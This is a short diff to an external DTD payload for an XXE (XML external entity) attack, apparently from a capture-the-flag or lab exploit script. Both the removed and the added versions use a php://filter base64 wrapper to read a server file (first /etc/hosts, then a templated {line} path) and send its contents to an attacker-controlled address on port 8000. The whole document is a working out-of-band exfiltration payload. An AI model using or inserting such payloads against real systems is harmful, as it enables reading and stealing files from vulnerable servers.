@@ -1,4 +1,3 @@
-<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/hosts">
-<!ENTITY % oob "<!ENTITY % content SYSTEM 'http://10.10.14.140:8000/?content=%file;'>">
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={line}">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.15.105:8000/?content=%file;'>">
 %oob;
-%content;
